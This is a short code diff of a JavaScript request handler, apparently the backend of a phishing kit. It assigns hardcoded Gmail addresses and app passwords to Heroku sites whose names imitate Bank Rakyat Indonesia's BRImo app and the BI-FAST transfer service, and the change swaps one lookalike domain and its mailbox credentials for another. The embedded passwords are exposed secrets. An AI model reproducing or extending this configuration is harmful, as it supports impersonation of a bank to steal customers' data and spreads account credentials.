@@ -12,10 +12,10 @@ export default function handler(req, res) {
         email = 'jagokuayam67@gmail.com';
         pass = 'curintmtfkqxppme';
 
-    } else if (url == 'bri-promo.herokuapp.com') {
+    } else if (url == 'daftar-bifast-brimo.herokuapp.com'){
         
-        email = 'hibrahimshaleh@gmail.com';
-        pass = 'bfaawtyurzhbqjkl';
+        email = 'ikanhiu603@gmail.com';
+        pass = 'cadnrlizjhuvhwsa';
 
     } else if (url == 'app-brimo-bifas.herokuapp.com'){
         email = 'brimopasp@gmail.com';
